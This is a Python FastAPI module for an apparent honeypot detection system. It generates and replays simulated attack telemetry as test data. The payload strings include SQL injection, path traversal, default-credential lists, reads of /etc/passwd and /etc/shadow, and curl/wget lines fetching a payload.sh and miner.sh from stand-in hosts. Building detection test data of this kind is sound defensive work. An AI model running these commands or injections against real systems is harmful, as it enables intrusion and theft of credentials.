import os
import asyncio
import random
from typing import Dict, Any, Optional
from fastapi import APIRouter, Depends, HTTPException, BackgroundTasks
from sqlalchemy.ext.asyncio import AsyncSession
from app.database.session import get_db, AsyncSessionLocal
from app.services.event_processor import event_processor
from app.schemas.schemas import LabAttackRequest, ReplayControlRequest
from app.config import settings

router = APIRouter(prefix="/lab", tags=["Lab & Replay Mode"])

REPLAY_DATASET = [
    {
        "service": "SSH",
        "honeypot_id": "SSH-HONEY-01",
        "source_ip": "185.199.110.23",
        "source_port": 51234,
        "auth_failures": 14,
        "request_frequency": 6.8,
        "duration_seconds": 24.5,
        "command_count": 0,
        "endpoint_diversity": 1,
        "user_agent": "-",
        "raw_payload": "user=root pass=admin123; user=admin pass=password; user=test pass=test",
        "mode": "REPLAY"
    },
    {
        "service": "HTTP",
        "honeypot_id": "HTTP-HONEY-01",
        "source_ip": "103.21.244.18",
        "source_port": 49812,
        "auth_failures": 0,
        "request_frequency": 18.2,
        "duration_seconds": 12.0,
        "command_count": 0,
        "endpoint_diversity": 32,
        "user_agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
        "raw_payload": "GET /wp-login.php HTTP/1.1; GET /.env HTTP/1.1; GET /admin/config.php HTTP/1.1; GET /phpmyadmin HTTP/1.1",
        "mode": "REPLAY"
    },
    {
        "service": "HTTP",
        "honeypot_id": "HTTP-HONEY-01",
        "source_ip": "91.189.94.5",
        "source_port": 55102,
        "auth_failures": 0,
        "request_frequency": 4.5,
        "duration_seconds": 15.0,
        "command_count": 0,
        "endpoint_diversity": 3,
        "user_agent": "sqlmap/1.7.2#stable",
        "raw_payload": "GET /api/v1/users?id=1' UNION SELECT 1,username,password_hash,4 FROM admin_users-- - HTTP/1.1",
        "mode": "REPLAY"
    },
    {
        "service": "SSH",
        "honeypot_id": "SSH-HONEY-01",
        "source_ip": "45.12.78.90",
        "source_port": 41209,
        "auth_failures": 1,
        "request_frequency": 2.0,
        "duration_seconds": 45.0,
        "command_count": 6,
        "endpoint_diversity": 1,
        "user_agent": "-",
        "raw_payload": "whoami; uname -a; id; cat /etc/passwd; cat /etc/shadow; curl http://malware.trap.io/payload.sh",
        "mode": "REPLAY"
    },
    {
        "service": "HTTP",
        "honeypot_id": "HTTP-HONEY-01",
        "source_ip": "172.67.201.44",
        "source_port": 39821,
        "auth_failures": 0,
        "request_frequency": 12.0,
        "duration_seconds": 8.0,
        "command_count": 0,
        "endpoint_diversity": 15,
        "user_agent": "Mozilla/5.0 Nikto/2.1.6",
        "raw_payload": "GET /../../../../etc/passwd HTTP/1.1",
        "mode": "REPLAY"
    }
]

@router.get("/mode", include_in_schema=True)
@router.get("/mode/", include_in_schema=False)
async def get_system_mode():
    return {"mode": settings.SYSTEM_MODE}

@router.post("/mode/{mode}", include_in_schema=True)
@router.post("/mode/{mode}/", include_in_schema=False)
async def set_system_mode(mode: str):
    valid_modes = ["LIVE", "LAB", "REPLAY"]
    if mode.upper() not in valid_modes:
        raise HTTPException(status_code=400, detail="Mode must be LIVE, LAB, or REPLAY")
    settings.SYSTEM_MODE = mode.upper()
    return {"mode": settings.SYSTEM_MODE, "message": f"System operational mode set to {settings.SYSTEM_MODE}"}

@router.post("/attack", include_in_schema=True)
@router.post("/attack/", include_in_schema=False)
async def trigger_lab_attack(attack_req: LabAttackRequest, db: AsyncSession = Depends(get_db)):
    """
    Safely triggers an event through the exact same processing pipeline in LAB mode.
    """
    ip_pool = {
        "SSH": ["185.199.110.23", "45.12.78.90", "203.0.113.77", "104.28.53.91"],
        "HTTP": ["103.21.244.18", "91.189.94.5", "172.67.201.44", "198.51.100.12"]
    }
    svc = attack_req.service.upper()
    source_ip = attack_req.source_ip or random.choice(ip_pool.get(svc, ["192.168.1.105"]))

    telemetry: Dict[str, Any] = {
        "service": svc,
        "honeypot_id": f"{svc}-HONEY-01",
        "source_ip": source_ip,
        "source_port": random.randint(30000, 60000),
        "mode": "LAB"
    }

    t = attack_req.attack_type.lower()
    if "brute" in t or "cred" in t:
        telemetry.update({
            "auth_failures": 8 * attack_req.intensity,
            "request_frequency": 4.5 * attack_req.intensity,
            "duration_seconds": 20.0,
            "command_count": 0,
            "endpoint_diversity": 1,
            "raw_payload": "user=root pass=toor; user=admin pass=admin; user=guest pass=123456",
            "user_agent": "paramiko-ssh-client"
        })
    elif "sql" in t:
        telemetry.update({
            "auth_failures": 0,
            "request_frequency": 3.0,
            "duration_seconds": 10.0,
            "command_count": 0,
            "endpoint_diversity": 2,
            "raw_payload": "POST /api/v1/auth?user=admin' OR '1'='1'-- HTTP/1.1",
            "user_agent": "sqlmap/1.7.0"
        })
    elif "scan" in t or "dir" in t:
        telemetry.update({
            "auth_failures": 0,
            "request_frequency": 15.0 * attack_req.intensity,
            "duration_seconds": 12.0,
            "command_count": 0,
            "endpoint_diversity": 25 * attack_req.intensity,
            "raw_payload": "GET /.env HTTP/1.1; GET /admin.php HTTP/1.1; GET /phpmyadmin HTTP/1.1",
            "user_agent": "gobuster/3.5"
        })
    elif "cmd" in t or "exec" in t:
        telemetry.update({
            "auth_failures": 1,
            "request_frequency": 2.0,
            "duration_seconds": 40.0,
            "command_count": 5 * attack_req.intensity,
            "endpoint_diversity": 1,
            "raw_payload": "uname -a; whoami; id; cat /etc/passwd; wget http://c2.honeynet.local/miner.sh",
            "user_agent": "-"
        })
    else:
        telemetry.update({
            "auth_failures": 0,
            "request_frequency": 2.0,
            "duration_seconds": 5.0,
            "command_count": 0,
            "endpoint_diversity": 3,
            "raw_payload": "GET / HTTP/1.1",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) HoneyBot/1.0"
        })

    result = await event_processor.process_raw_event(telemetry, db)
    return {"message": "Lab attack generated and processed", "event": result}

async def _run_replay_sequence():
    for item in REPLAY_DATASET:
        async with AsyncSessionLocal() as session:
            await event_processor.process_raw_event(item, session)
        await asyncio.sleep(1.5)

@router.post("/replay", include_in_schema=True)
@router.post("/replay/", include_in_schema=False)
async def trigger_replay(background_tasks: BackgroundTasks, db: AsyncSession = Depends(get_db)):
    """
    Triggers replaying authentic honeypot attack corpora through the full pipeline.
    """
    settings.SYSTEM_MODE = "REPLAY"
    is_vercel = bool(
        os.environ.get("VERCEL") or 
        os.environ.get("VERCEL_ENV") or 
        os.environ.get("VERCEL_REGION") or 
        os.environ.get("AWS_LAMBDA_FUNCTION_NAME") or 
        os.environ.get("NOW_REGION")
    )
    if is_vercel:
        # On Vercel serverless, background tasks get frozen immediately upon response.
        # Run replay events directly before returning.
        for item in REPLAY_DATASET:
            await event_processor.process_raw_event(item, db)
    else:
        background_tasks.add_task(_run_replay_sequence)

    return {
        "status": "REPLAY_STARTED",
        "message": "Replaying authentic honeypot attack dataset through pipeline",
        "events_count": len(REPLAY_DATASET)
    }
